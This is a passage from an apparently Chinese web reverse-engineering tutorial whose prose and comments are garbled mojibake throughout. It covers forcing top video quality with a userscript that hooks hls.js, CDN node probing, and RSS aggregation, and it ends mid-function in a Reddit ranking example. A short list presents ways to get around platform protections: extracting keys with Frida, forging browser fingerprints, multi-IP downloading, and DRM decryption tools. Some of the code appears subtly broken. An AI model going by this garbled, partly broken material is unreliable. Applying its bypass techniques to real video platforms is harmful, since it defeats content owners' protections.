// @description  å¼ºåˆ¶è§†é¢‘æ’­æ”¾æœ€é«˜è´¨é‡
// @match        https://video.example.com/*
// @grant        none
// ==/UserScript==

(function () {
  &quot;use strict&quot;;

  // ç­‰å¾…æ’­æ”¾å™¨åŠ è½½
  const observer = new MutationObserver((mutations, obs) =&gt; {
    const player = document.querySelector(&quot;video&quot;);
    if (player) {
      obs.disconnect();
      forceHighestQuality();
    }
  });

  observer.observe(document.body, {
    childList: true,
    subtree: true,
  });

  function forceHighestQuality() {
    // æ–¹æ³• 1: ä¿®æ”¹ HTMLMediaElement
    const video = document.querySelector(&quot;video&quot;);

    Object.defineProperty(video, &quot;playbackQuality&quot;, {
      get: function () {
        return {
          totalVideoFrames: 10000,
          droppedVideoFrames: 0,
          corruptedVideoFrames: 0,
        };
      },
    });

    // æ–¹æ³• 2: Hook hls.js
    if (window.Hls) {
      const originalLoadSource = Hls.prototype.loadSource;

      Hls.prototype.loadSource = function (url) {
        // å¼ºåˆ¶åŠ è½½æœ€é«˜è´¨é‡çš„ m3u8
        url = url.replace(/\d+p\.m3u8/, &quot;2160p.m3u8&quot;);
        return originalLoadSource.call(this, url);
      };

      // ç¦ç”¨è‡ªåŠ¨è´¨é‡åˆ‡æ¢
      const player = new Hls({
        autoStartLoad: true,
        startLevel: -1, // -1 è¡¨ç¤ºæœ€é«˜è´¨é‡
        capLevelToPlayerSize: false, // ä¸é™åˆ¶è´¨é‡
      });
    }

    console.log(&quot;Forced to highest quality&quot;);
  }
})();
</code></pre>
<h3>Python å®ç° - æ¨¡æ‹Ÿ ABR ç®—æ³•</h3>
<pre><code class="language-python">class VideoQualitySelector:
    def __init__(self):
        self.qualities = [
            {'name': '360p', 'width': 640, 'height': 360, 'bitrate': 800000},
            {'name': '720p', 'width': 1280, 'height': 720, 'bitrate': 2500000},
            {'name': '1080p', 'width': 1920, 'height': 1080, 'bitrate': 5000000},
            {'name': '4K', 'width': 3840, 'height': 2160, 'bitrate': 15000000},
        ]
        self.current_quality = 1  # é»˜è®¤ 720p

    def estimate_bandwidth(self, download_history):
        &quot;&quot;&quot;ä¼°ç®—å½“å‰å¸¦å®½&quot;&quot;&quot;
        if not download_history:
            return 5000000  # é»˜è®¤ 5 Mbps

        # ä½¿ç”¨æœ€è¿‘ 5 æ¬¡ä¸‹è½½çš„å¹³å‡é€Ÿåº¦
        recent = download_history[-5:]
        total_bytes = sum(d['bytes'] for d in recent)
        total_time = sum(d['time'] for d in recent)

        if total_time == 0:
            return 5000000

        return (total_bytes * 8) / total_time  # bps

    def select_quality(self, bandwidth, buffer_level, force_highest=False):
        &quot;&quot;&quot;é€‰æ‹©åˆé€‚çš„è§†é¢‘è´¨é‡&quot;&quot;&quot;
        if force_highest:
            return len(self.qualities) - 1

        # ç¼“å†²åŒºä¸è¶³ï¼Œé™çº§
        if buffer_level &lt; 5:
            return max(0, self.current_quality - 1)

        # é€‰æ‹©æœ€é«˜å¯ç”¨è´¨é‡ï¼ˆå¸¦å®½ &gt; æ¯”ç‰¹ç‡ * 1.5ï¼‰
        for i in range(len(self.qualities) - 1, -1, -1):
            if bandwidth &gt;= self.qualities[i]['bitrate'] * 1.5:
                # é¿å…é¢‘ç¹åˆ‡æ¢ï¼ˆæœ€å¤šä¸€æ¬¡å˜åŒ–ä¸€çº§ï¼‰
                if abs(i - self.current_quality) &lt;= 1:
                    self.current_quality = i
                    return i

        return self.current_quality

    def get_quality_url(self, base_url, quality_index):
        &quot;&quot;&quot;è·å–æŒ‡å®šè´¨é‡çš„æ’­æ”¾åœ°å€&quot;&quot;&quot;
        quality = self.qualities[quality_index]
        return f&quot;{base_url}/{quality['name']}.m3u8&quot;

# ä½¿ç”¨ç¤ºä¾‹
selector = VideoQualitySelector()

# æ¨¡æ‹Ÿä¸‹è½½å†å²
download_history = [
    {'bytes': 1000000, 'time': 1.5},  # ~5.3 Mbps
    {'bytes': 1200000, 'time': 1.8},  # ~5.3 Mbps
    {'bytes': 1500000, 'time': 2.0},  # 6 Mbps
]

bandwidth = selector.estimate_bandwidth(download_history)
quality_index = selector.select_quality(
    bandwidth=bandwidth,
    buffer_level=10,  # 10 ç§’ç¼“å†²
    force_highest=True  # å¼ºåˆ¶æœ€é«˜è´¨é‡
)

print(f&quot;Selected quality: {selector.qualities[quality_index]['name']}&quot;)
</code></pre>
<hr />
<h2>æ¡ˆä¾‹ 5: CDN èŠ‚ç‚¹å‘ç°ä¸ä¼˜é€‰</h2>
<h3>èƒŒæ™¯</h3>
<p>è§†é¢‘å¹³å°ä½¿ç”¨å¤šä¸ª CDN èŠ‚ç‚¹åˆ†å‘å†…å®¹ã€‚é€†å‘èŠ‚ç‚¹é€‰æ‹©é€»è¾‘ï¼Œå¯ä»¥æ‰¾åˆ°æœ€å¿«çš„ä¸‹è½½èŠ‚ç‚¹ã€‚</p>
<h3>é€†å‘æ­¥éª¤</h3>
<h4>1. æŠ“åŒ…åˆ†æ CDN è°ƒåº¦</h4>
<p><strong>DNS è§£æ</strong>:</p>
<pre><code>cdn.example.com -&gt; CNAME -&gt; geo.cdn.example.com
geo.cdn.example.com -&gt; A è®°å½•:
  - 1.2.3.4 (åŒ—äº¬èŠ‚ç‚¹)
  - 5.6.7.8 (ä¸Šæµ·èŠ‚ç‚¹)
  - 9.10.11.12 (å¹¿å·èŠ‚ç‚¹)
</code></pre>
<p><strong>HTTP é‡å®šå‘</strong>:</p>
<pre><code>GET /video/abc123.mp4
HTTP/1.1 302 Found
Location: https://bj-cdn01.example.com/video/abc123.mp4
</code></pre>
<h4>2. JavaScript èŠ‚ç‚¹é€‰æ‹©é€»è¾‘</h4>
<pre><code class="language-javascript">class CDNSelector {
  constructor() {
    this.nodes = [
      { id: &quot;bj-01&quot;, url: &quot;https://bj-cdn01.example.com&quot;, region: &quot;beijing&quot; },
      { id: &quot;sh-01&quot;, url: &quot;https://sh-cdn01.example.com&quot;, region: &quot;shanghai&quot; },
      { id: &quot;gz-01&quot;, url: &quot;https://gz-cdn01.example.com&quot;, region: &quot;guangzhou&quot; },
    ];
    this.selectedNode = null;
  }

  async selectBestNode(testFile = &quot;/ping.txt&quot;) {
    /**
     * èŠ‚ç‚¹é€‰æ‹©ç­–ç•¥:
     * 1. å¹¶å‘æµ‹è¯•æ‰€æœ‰èŠ‚ç‚¹çš„å»¶è¿Ÿ
     * 2. é€‰æ‹©å»¶è¿Ÿæœ€ä½çš„èŠ‚ç‚¹
     * 3. ç¼“å­˜ç»“æœ 5 åˆ†é’Ÿ
     */

    const results = await Promise.all(
      this.nodes.map((node) =&gt; this.testNode(node, testFile))
    );

    // æŒ‰å»¶è¿Ÿæ’åº
    results.sort((a, b) =&gt; a.latency - b.latency);

    this.selectedNode = results[0].node;
    console.log(
      `Selected CDN node: ${this.selectedNode.id} (${results[0].latency}ms)`
    );

    return this.selectedNode;
  }

  async testNode(node, testFile) {
    const start = performance.now();

    try {
      await fetch(node.url + testFile, {
        method: &quot;HEAD&quot;,
        cache: &quot;no-cache&quot;,
      });

      const latency = performance.now() - start;
      return { node, latency };
    } catch (error) {
      return { node, latency: Infinity };
    }
  }

  getVideoUrl(path) {
    if (!this.selectedNode) {
      throw new Error(&quot;No CDN node selected&quot;);
    }

    return this.selectedNode.url + path;
  }
}
</code></pre>
<h4>3. å¤š CDN æºæ¢æµ‹</h4>
<p>æŸäº›å¹³å°ä¼šåœ¨ä¸åŒ CDN æä¾›å•†ä¹‹é—´åˆ†å‘:</p>
<pre><code class="language-javascript">async function discoverCDNSources(videoId) {
  /**
   * æ¢æµ‹å¤šä¸ªå¯èƒ½çš„ CDN æº
   */
  const cdnProviders = [
    &quot;akamai.example.com&quot;,
    &quot;cloudflare.example.com&quot;,
    &quot;cloudfront.example.com&quot;,
    &quot;fastly.example.com&quot;,
  ];

  const sources = [];

  for (const provider of cdnProviders) {
    const url = `https://${provider}/video/${videoId}.mp4`;

    try {
      const response = await fetch(url, { method: &quot;HEAD&quot; });
      if (response.ok) {
        sources.push({
          provider: provider,
          url: url,
          size: response.headers.get(&quot;Content-Length&quot;),
          server: response.headers.get(&quot;Server&quot;),
        });
      }
    } catch (e) {
      // è¯¥ CDN ä¸å¯ç”¨
    }
  }

  return sources;
}
</code></pre>
<h3>Python å®ç° - CDN èŠ‚ç‚¹æµ‹é€Ÿ</h3>
<pre><code class="language-python">import time
import asyncio
import aiohttp
from typing import List, Dict

class CDNOptimizer:
    def __init__(self, cdn_nodes: List[Dict]):
        &quot;&quot;&quot;
        cdn_nodes: [
            {'id': 'bj-01', 'url': 'https://bj-cdn.example.com'},
            {'id': 'sh-01', 'url': 'https://sh-cdn.example.com'},
            ...
        ]
        &quot;&quot;&quot;
        self.cdn_nodes = cdn_nodes
        self.best_node = None

    async def test_node_latency(self, session, node, test_file='/ping.txt'):
        &quot;&quot;&quot;æµ‹è¯•å•ä¸ªèŠ‚ç‚¹çš„å»¶è¿Ÿ&quot;&quot;&quot;
        url = node['url'] + test_file

        try:
            start = time.time()
            async with session.head(url, timeout=5) as response:
                latency = (time.time() - start) * 1000  # ms

                return {
                    'node': node,
                    'latency': latency,
                    'status': response.status,
                    'server': response.headers.get('Server', 'Unknown')
                }
        except Exception as e:
            return {
                'node': node,
                'latency': float('inf'),
                'status': 0,
                'error': str(e)
            }

    async def test_node_bandwidth(self, session, node, test_size_mb=1):
        &quot;&quot;&quot;æµ‹è¯•èŠ‚ç‚¹å¸¦å®½&quot;&quot;&quot;
        # ä¸‹è½½æµ‹è¯•æ–‡ä»¶ï¼ˆä¾‹å¦‚ 1MBï¼‰
        test_url = f&quot;{node['url']}/speedtest/{test_size_mb}mb.bin&quot;

        try:
            start = time.time()
            async with session.get(test_url, timeout=30) as response:
                data = await response.read()
                duration = time.time() - start

                # è®¡ç®—å¸¦å®½ (Mbps)
                bandwidth = (len(data) * 8) / (duration * 1_000_000)

                return {
                    'node': node,
                    'bandwidth': bandwidth,
                    'duration': duration
                }
        except Exception as e:
            return {
                'node': node,
                'bandwidth': 0,
                'error': str(e)
            }

    async def select_best_node(self, mode='latency'):
        &quot;&quot;&quot;é€‰æ‹©æœ€ä½³èŠ‚ç‚¹&quot;&quot;&quot;
        async with aiohttp.ClientSession() as session:
            if mode == 'latency':
                # åŸºäºå»¶è¿Ÿé€‰æ‹©
                tasks = [
                    self.test_node_latency(session, node)
                    for node in self.cdn_nodes
                ]
                results = await asyncio.gather(*tasks)

                # æ’åºå¹¶é€‰æ‹©å»¶è¿Ÿæœ€ä½çš„
                results.sort(key=lambda x: x['latency'])
                self.best_node = results[0]['node']

                print(f&quot;Best node (latency): {self.best_node['id']}&quot;)
                for r in results[:3]:  # æ˜¾ç¤ºå‰ 3 ä¸ª
                    print(f&quot;  {r['node']['id']}: {r['latency']:.2f}ms&quot;)

            elif mode == 'bandwidth':
                # åŸºäºå¸¦å®½é€‰æ‹©
                tasks = [
                    self.test_node_bandwidth(session, node)
                    for node in self.cdn_nodes
                ]
                results = await asyncio.gather(*tasks)

                # æ’åºå¹¶é€‰æ‹©å¸¦å®½æœ€é«˜çš„
                results.sort(key=lambda x: x['bandwidth'], reverse=True)
                self.best_node = results[0]['node']

                print(f&quot;Best node (bandwidth): {self.best_node['id']}&quot;)
                for r in results[:3]:
                    print(f&quot;  {r['node']['id']}: {r['bandwidth']:.2f} Mbps&quot;)

        return self.best_node

    def get_video_url(self, video_path):
        &quot;&quot;&quot;è·å–ä½¿ç”¨æœ€ä½³èŠ‚ç‚¹çš„è§†é¢‘ URL&quot;&quot;&quot;
        if not self.best_node:
            raise Exception(&quot;Please select best node first&quot;)

        return self.best_node['url'] + video_path

# ä½¿ç”¨ç¤ºä¾‹
async def main():
    cdn_nodes = [
        {'id': 'bj-01', 'url': 'https://bj-cdn.example.com'},
        {'id': 'sh-01', 'url': 'https://sh-cdn.example.com'},
        {'id': 'gz-01', 'url': 'https://gz-cdn.example.com'},
        {'id': 'sz-01', 'url': 'https://sz-cdn.example.com'},
    ]

    optimizer = CDNOptimizer(cdn_nodes)

    # æ–¹æ³• 1: åŸºäºå»¶è¿Ÿé€‰æ‹©
    await optimizer.select_best_node(mode='latency')

    # æ–¹æ³• 2: åŸºäºå¸¦å®½é€‰æ‹©
    # await optimizer.select_best_node(mode='bandwidth')

    # è·å–è§†é¢‘ URL
    video_url = optimizer.get_video_url('/video/abc123.mp4')
    print(f&quot;Video URL: {video_url}&quot;)

# è¿è¡Œ
asyncio.run(main())
</code></pre>
<h3>é«˜çº§æŠ€å·§: åå‘è§£æ CDN èŠ‚ç‚¹</h3>
<pre><code class="language-python">import dns.resolver
import socket

def discover_all_cdn_nodes(domain):
    &quot;&quot;&quot;é€šè¿‡ DNS æŸ¥è¯¢å‘ç°æ‰€æœ‰ CDN èŠ‚ç‚¹&quot;&quot;&quot;
    nodes = []

    try:
        # è§£æ CNAME
        answers = dns.resolver.resolve(domain, 'CNAME')
        for rdata in answers:
            print(f&quot;CNAME: {rdata.target}&quot;)

            # è§£æ A è®°å½•
            a_records = dns.resolver.resolve(str(rdata.target), 'A')
            for a_rdata in a_records:
                ip = str(a_rdata)

                # åå‘ DNS æŸ¥è¯¢è·å–èŠ‚ç‚¹åç§°
                try:
                    hostname = socket.gethostbyaddr(ip)[0]
                except:
                    hostname = ip

                nodes.append({
                    'ip': ip,
                    'hostname': hostname
                })

                print(f&quot;  -&gt; {ip} ({hostname})&quot;)

    except Exception as e:
        print(f&quot;Error: {e}&quot;)

    return nodes

# ä½¿ç”¨ç¤ºä¾‹
nodes = discover_all_cdn_nodes('cdn.example.com')
</code></pre>
<hr />
<h2>é˜²æŠ¤ä¸å¯¹æŠ—æ€»ç»“</h2>
<h3>å¹³å°é˜²æŠ¤æªæ–½</h3>
<ol>
<li><strong>URL ç­¾å</strong>: æ—¶é—´æˆ³ + å¯†é’¥ç­¾å</li>
<li><strong>è®¾å¤‡æŒ‡çº¹</strong>: ç»‘å®šè®¾å¤‡ï¼Œé™åˆ¶å¹¶å‘</li>
<li><strong>æ’­æ”¾æ¬¡æ•°é™åˆ¶</strong>: å•ä¸ªè§†é¢‘æ’­æ”¾æ¬¡æ•°</li>
<li><strong>DRM ä¿æŠ¤</strong>: Widevineã€PlayReady</li>
<li><strong>åŠ¨æ€å¯†é’¥</strong>: å®šæœŸè½®æ¢åŠ å¯†å¯†é’¥</li>
<li><strong>æ°´å°æŠ€æœ¯</strong>: æº¯æºç›—ç‰ˆè§†é¢‘</li>
<li><strong>CDN é‰´æƒ</strong>: Token éªŒè¯</li>
<li><strong>æµé‡åˆ†æ</strong>: æ£€æµ‹å¼‚å¸¸ä¸‹è½½è¡Œä¸º</li>
</ol>
<h3>é€†å‘å¯¹æŠ—æŠ€å·§</h3>
<ol>
<li><strong>è‡ªåŠ¨åŒ–è„šæœ¬</strong>: Seleniumã€Playwright æ¨¡æ‹ŸçœŸå®ç”¨æˆ·</li>
<li><strong>å¯†é’¥æå–</strong>: Frida Hookã€å†…å­˜æ‰«æ</li>
<li><strong>åè®®åˆ†æ</strong>: Wiresharkã€mitmproxy</li>
<li><strong>ä»£ç æ··æ·†è¿˜åŸ</strong>: AST åˆ†æã€ç¬¦å·æ‰§è¡Œ</li>
<li><strong>CDN ä¼˜é€‰</strong>: å¤šèŠ‚ç‚¹æµ‹é€Ÿã€æ™ºèƒ½é€‰æ‹©</li>
<li><strong>åˆ†å¸ƒå¼ä¸‹è½½</strong>: å¤šè´¦å·ã€å¤š IP å¹¶å‘</li>
<li><strong>æµè§ˆå™¨æŒ‡çº¹ä¼ªé€ </strong>: ç»•è¿‡è®¾å¤‡æ£€æµ‹</li>
</ol>
<hr />
<h2>æ³•å¾‹ä¸é“å¾·å£°æ˜</h2>
<p><strong>æœ¬æ–‡ä»…ç”¨äºæŠ€æœ¯ç ”ç©¶å’Œæ•™è‚²ç›®çš„</strong>ã€‚ç»•è¿‡è§†é¢‘å¹³å°çš„ä¿æŠ¤æªæ–½å¯èƒ½è¿å:</p>
<ul>
<li>æœåŠ¡æ¡æ¬¾ (ToS)</li>
<li>æ•°å­—åƒå¹´ç‰ˆæƒæ³•æ¡ˆ (DMCA)</li>
<li>è®¡ç®—æœºæ¬ºè¯ˆå’Œæ»¥ç”¨æ³• (CFAA)</li>
<li>å„å›½çŸ¥è¯†äº§æƒæ³•å¾‹</li>
</ul>
<p>è¯·ä»…åœ¨æˆæƒç¯å¢ƒä¸‹è¿›è¡Œå®‰å…¨æµ‹è¯•ï¼Œå°Šé‡å†…å®¹åˆ›ä½œè€…çš„æƒç›Šã€‚</p>
<hr />
<h2>å·¥å…·æ¨è</h2>
<h3>è§†é¢‘ä¸‹è½½å·¥å…·</h3>
<ul>
<li><strong>yt-dlp</strong>: æ”¯æŒ 1000+ ç½‘ç«™</li>
<li><strong>you-get</strong>: å›½å†…è§†é¢‘å¹³å°</li>
<li><strong>N_m3u8DL-CLI</strong>: M3U8 ä¸“ä¸šä¸‹è½½å™¨</li>
<li><strong>streamlink</strong>: ç›´æ’­æµä¸‹è½½</li>
</ul>
<h3>åˆ†æå·¥å…·</h3>
<ul>
<li><strong>Wireshark</strong>: ç½‘ç»œåè®®åˆ†æ</li>
<li><strong>Chrome DevTools</strong>: æµè§ˆå™¨è°ƒè¯•</li>
<li><strong>Frida</strong>: åŠ¨æ€åˆ†æ</li>
<li><strong>mitmproxy</strong>: HTTPS ä»£ç†</li>
</ul>
<h3>è§£å¯†å·¥å…·</h3>
<ul>
<li><strong>ffmpeg</strong>: è§†é¢‘å¤„ç†ã€è½¬ç </li>
<li><strong>mp4decrypt</strong>: MP4 è§£å¯†ï¼ˆBento4ï¼‰</li>
<li><strong>shaka-packager</strong>: DRM å°è£…/è§£å°</li>
</ul>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-15">æµè§ˆå™¨ DevTools ä½¿ç”¨</a></li>
<li>æŠ“åŒ…ä¸ä»£ç†å·¥å…·</li>
<li>JavaScript æ··æ·†ä¸åæ··æ·†</li>
<li><a href="#section-36">WebAssembly é€†å‘</a></li>
<li>DRM ä¿æŠ¤æœºåˆ¶</li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-49">
                                                <h2>[R48] News Aggregator</h2>
                                                <h1>R48: æ–°é—»èšåˆç½‘ç«™</h1>
<h2>æ¦‚è¿°</h2>
<p>æ–°é—»èšåˆç½‘ç«™ï¼ˆå¦‚ Hacker Newsã€Redditã€ä»Šæ—¥å¤´æ¡ï¼‰æ±‡é›†å¤šä¸ªæ–°é—»æºï¼Œå¹¶æä¾›ä¸ªæ€§åŒ–æ¨èã€‚æœ¬æ–‡é€šè¿‡ 5 ä¸ªçœŸå®æ¡ˆä¾‹ï¼Œæ·±å…¥è®²è§£æ–°é—»èšåˆå¹³å°çš„é€†å‘æŠ€æœ¯ã€‚</p>
<hr />
<h2>æ¡ˆä¾‹ 1: RSS/Atom Feed èšåˆä¸è§£æ</h2>
<h3>èƒŒæ™¯</h3>
<p>ä¼ ç»Ÿæ–°é—»èšåˆä¾èµ– RSS/Atom feedsã€‚é€†å‘è¿™äº› feeds å¯ä»¥å®ç°è‡ªå®šä¹‰æ–°é—»èšåˆå™¨ã€‚</p>
<h3>Feed æ ¼å¼</h3>
<h4>RSS 2.0</h4>
<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;rss version=&quot;2.0&quot;&gt;
  &lt;channel&gt;
    &lt;title&gt;Example News&lt;/title&gt;
    &lt;link&gt;https://news.example.com&lt;/link&gt;
    &lt;description&gt;Latest news from Example&lt;/description&gt;
    &lt;item&gt;
      &lt;title&gt;Breaking News: AI Breakthrough&lt;/title&gt;
      &lt;link&gt;https://news.example.com/article/123&lt;/link&gt;
      &lt;description&gt;Scientists announce major AI advancement...&lt;/description&gt;
      &lt;pubDate&gt;Mon, 18 Dec 2023 10:00:00 GMT&lt;/pubDate&gt;
      &lt;guid&gt;https://news.example.com/article/123&lt;/guid&gt;
    &lt;/item&gt;
  &lt;/channel&gt;
&lt;/rss&gt;
</code></pre>
<h4>Atom 1.0</h4>
<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;feed xmlns=&quot;http://www.w3.org/2005/Atom&quot;&gt;
  &lt;title&gt;Example News&lt;/title&gt;
  &lt;link href=&quot;https://news.example.com&quot;/&gt;
  &lt;updated&gt;2023-12-18T10:00:00Z&lt;/updated&gt;
  &lt;entry&gt;
    &lt;title&gt;Breaking News: AI Breakthrough&lt;/title&gt;
    &lt;link href=&quot;https://news.example.com/article/123&quot;/&gt;
    &lt;id&gt;urn:uuid:1234-5678-90ab-cdef&lt;/id&gt;
    &lt;updated&gt;2023-12-18T10:00:00Z&lt;/updated&gt;
    &lt;summary&gt;Scientists announce major AI advancement...&lt;/summary&gt;
  &lt;/entry&gt;
&lt;/feed&gt;
</code></pre>
<h3>Python å®ç° - RSS èšåˆå™¨</h3>
<pre><code class="language-python">import feedparser
import requests
from datetime import datetime
from typing import List, Dict
import sqlite3

class RSSAggregator:
    def __init__(self, db_path='news.db'):
        self.db_path = db_path
        self.init_database()

    def init_database(self):
        &quot;&quot;&quot;åˆå§‹åŒ–æ•°æ®åº“&quot;&quot;&quot;
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS articles (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                title TEXT,
                link TEXT UNIQUE,
                description TEXT,
                published DATETIME,
                source TEXT,
                category TEXT,
                read BOOLEAN DEFAULT 0
            )
        ''')

        conn.commit()
        conn.close()

    def fetch_feed(self, feed_url: str, source_name: str):
        &quot;&quot;&quot;è·å–å¹¶è§£æ RSS/Atom feed&quot;&quot;&quot;
        try:
            # ä½¿ç”¨ feedparser è‡ªåŠ¨æ£€æµ‹æ ¼å¼
            feed = feedparser.parse(feed_url)

            articles = []

            for entry in feed.entries:
                article = {
                    'title': entry.get('title', ''),
                    'link': entry.get('link', ''),
                    'description': entry.get('description') or entry.get('summary', ''),
                    'published': self._parse_date(entry.get('published', '')),
                    'source': source_name,
                    'category': self._extract_category(entry)
                }

                articles.append(article)

            return articles

        except Exception as e:
            print(f&quot;Error fetching {feed_url}: {e}&quot;)
            return []

    def _parse_date(self, date_str):
        &quot;&quot;&quot;è§£ææ—¥æœŸ&quot;&quot;&quot;
        if not date_str:
            return datetime.now()

        try:
            # feedparser å·²ç»è§£æäº†æ—¥æœŸ
            from email.utils import parsedate_to_datetime
            return parsedate_to_datetime(date_str)
        except:
            return datetime.now()

    def _extract_category(self, entry):
        &quot;&quot;&quot;æå–åˆ†ç±»&quot;&quot;&quot;
        # ä» tags ä¸­æå–
        if hasattr(entry, 'tags'):
            return ', '.join([tag.term for tag in entry.tags[:3]])

        # ä» category ä¸­æå–
        if hasattr(entry, 'category'):
            return entry.category

        return 'General'

    def save_articles(self, articles: List[Dict]):
        &quot;&quot;&quot;ä¿å­˜æ–‡ç« åˆ°æ•°æ®åº“&quot;&quot;&quot;
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        for article in articles:
            try:
                cursor.execute('''
                    INSERT OR IGNORE INTO articles
                    (title, link, description, published, source, category)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (
                    article['title'],
                    article['link'],
                    article['description'],
                    article['published'],
                    article['source'],
                    article['category']
                ))
            except Exception as e:
                print(f&quot;Error saving article: {e}&quot;)

        conn.commit()
        conn.close()

    def aggregate_multiple_feeds(self, feeds: Dict[str, str]):
        &quot;&quot;&quot;
        èšåˆå¤šä¸ª feeds
        feeds: {'Source Name': 'feed_url', ...}
        &quot;&quot;&quot;
        all_articles = []

        for source_name, feed_url in feeds.items():
            print(f&quot;Fetching {source_name}...&quot;)
            articles = self.fetch_feed(feed_url, source_name)
            all_articles.extend(articles)

        self.save_articles(all_articles)
        print(f&quot;Total articles fetched: {len(all_articles)}&quot;)

        return all_articles

    def get_latest_articles(self, limit=20, category=None):
        &quot;&quot;&quot;è·å–æœ€æ–°æ–‡ç« &quot;&quot;&quot;
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        if category:
            cursor.execute('''
                SELECT * FROM articles
                WHERE category LIKE ?
                ORDER BY published DESC
                LIMIT ?
            ''', (f'%{category}%', limit))
        else:
            cursor.execute('''
                SELECT * FROM articles
                ORDER BY published DESC
                LIMIT ?
            ''', (limit,))

        articles = cursor.fetchall()
        conn.close()

        return articles

# ä½¿ç”¨ç¤ºä¾‹
aggregator = RSSAggregator()

# å®šä¹‰ feeds
feeds = {
    'Hacker News': 'https://news.ycombinator.com/rss',
    'TechCrunch': 'https://techcrunch.com/feed/',
    'Ars Technica': 'https://feeds.arstechnica.com/arstechnica/index',
    'The Verge': 'https://www.theverge.com/rss/index.xml',
    'Reddit Python': 'https://www.reddit.com/r/python/.rss'
}

# èšåˆæ‰€æœ‰ feeds
aggregator.aggregate_multiple_feeds(feeds)

# è·å–æœ€æ–° 20 ç¯‡æ–‡ç« 
latest = aggregator.get_latest_articles(limit=20)

for article in latest:
    print(f&quot;[{article[5]}] {article[1]}&quot;)  # [source] title
    print(f&quot;  {article[2]}&quot;)  # link
    print()
</code></pre>
<h3>é«˜çº§åŠŸèƒ½</h3>
<h4>1. Feed è‡ªåŠ¨å‘ç°</h4>
<p>æŸäº›ç½‘ç«™æ²¡æœ‰æ˜æ˜¾çš„ RSS é“¾æ¥ï¼Œéœ€è¦è‡ªåŠ¨å‘ç°:</p>
<pre><code class="language-python">import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

def discover_feeds(url):
    &quot;&quot;&quot;è‡ªåŠ¨å‘ç°ç½‘ç«™çš„ RSS/Atom feeds&quot;&quot;&quot;
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')

        feeds = []

        # æŸ¥æ‰¾ &lt;link&gt; æ ‡ç­¾
        for link in soup.find_all('link', type=['application/rss+xml', 'application/atom+xml']):
            feed_url = urljoin(url, link.get('href', ''))
            feed_title = link.get('title', 'Untitled Feed')

            feeds.append({
                'url': feed_url,
                'title': feed_title,
                'type': link.get('type')
            })

        # å¸¸è§çš„ feed è·¯å¾„
        common_paths = ['/feed', '/rss', '/atom.xml', '/rss.xml', '/feed.xml']

        for path in common_paths:
            test_url = urljoin(url, path)
            try:
                r = requests.head(test_url, timeout=3)
                if r.status_code == 200:
                    feeds.append({
                        'url': test_url,
                        'title': f'Feed at {path}',
                        'type': 'application/rss+xml'
                    })
            except:
                continue

        return feeds

    except Exception as e:
        print(f&quot;Error discovering feeds: {e}&quot;)
        return []

# ä½¿ç”¨ç¤ºä¾‹
feeds = discover_feeds('https://blog.example.com')
for feed in feeds:
    print(f&quot;{feed['title']}: {feed['url']}&quot;)
</code></pre>
<h4>2. Full Content Extraction</h4>
<p>RSS feed é€šå¸¸åªåŒ…å«æ‘˜è¦ï¼Œéœ€è¦æå–å®Œæ•´å†…å®¹:</p>
<pre><code class="language-python">from newspaper import Article
import re

class FullContentExtractor:
    def __init__(self):
        pass

    def extract_article(self, url):
        &quot;&quot;&quot;æå–å®Œæ•´æ–‡ç« å†…å®¹&quot;&quot;&quot;
        try:
            article = Article(url)
            article.download()
            article.parse()

            # NLP å¤„ç†ï¼ˆå¯é€‰ï¼‰
            article.nlp()

            return {
                'title': article.title,
                'authors': article.authors,
                'publish_date': article.publish_date,
                'text': article.text,
                'top_image': article.top_image,
                'videos': article.movies,
                'keywords': article.keywords,
                'summary': article.summary
            }

        except Exception as e:
            print(f&quot;Error extracting {url}: {e}&quot;)
            return None

    def clean_text(self, text):
        &quot;&quot;&quot;æ¸…ç†æ–‡æœ¬&quot;&quot;&quot;
        # ç§»é™¤å¤šä½™ç©ºè¡Œ
        text = re.sub(r'\n{3,}', '\n\n', text)

        # ç§»é™¤å¹¿å‘Šæ ‡è®°
        ad_patterns = [
            r'\[å¹¿å‘Š\].*?\n',
            r'Advertisement.*?\n',
            r'Sponsored.*?\n'
        ]

        for pattern in ad_patterns:
            text = re.sub(pattern, '', text, flags=re.IGNORECASE)

        return text.strip()

# ä½¿ç”¨ç¤ºä¾‹
extractor = FullContentExtractor()
content = extractor.extract_article('https://news.example.com/article/123')

if content:
    print(f&quot;Title: {content['title']}&quot;)
    print(f&quot;Summary: {content['summary']}&quot;)
</code></pre>
<hr />
<h2>æ¡ˆä¾‹ 2: ä¸ªæ€§åŒ–æ¨èç®—æ³•é€†å‘</h2>
<h3>èƒŒæ™¯</h3>
<p>æ–°é—»èšåˆå¹³å°ï¼ˆå¦‚ä»Šæ—¥å¤´æ¡ã€Redditï¼‰ä½¿ç”¨æ¨èç®—æ³•ä¸ªæ€§åŒ–å†…å®¹ã€‚é€†å‘è¿™äº›ç®—æ³•å¯ä»¥ç†è§£æ¨èæœºåˆ¶ã€‚</p>
<h3>Reddit æ’åç®—æ³•</h3>
<p>Reddit ä½¿ç”¨ &quot;Hot&quot; æ’åç®—æ³•:</p>
<pre><code class="language-python">from datetime import datetime
import math

def reddit_hot_score(ups, downs, date):
    &quot;&quot;&quot;
    Reddit Hot ç®—æ³•
    - ups: ç‚¹èµæ•°
    - downs: è¸©æ•°
    - date: å‘å¸ƒæ—¶é—´
    &quot;&quot;&quot;
    # è®¡ç®—åˆ†æ•°
    s = ups - downs

    # æ’åºï¼ˆ1 è¡¨ç¤ºæ­£åˆ†ï¼Œ-1 è¡¨ç¤ºè´Ÿåˆ†ï¼Œ0 è¡¨ç¤ºä¸­æ€§ï¼‰
    order = math.log(max(abs(s), 1), 10)

    if s &gt; 0:
        sign = 1
    elif s &lt; 0:
        sign = -1
    else:
        sign = 0

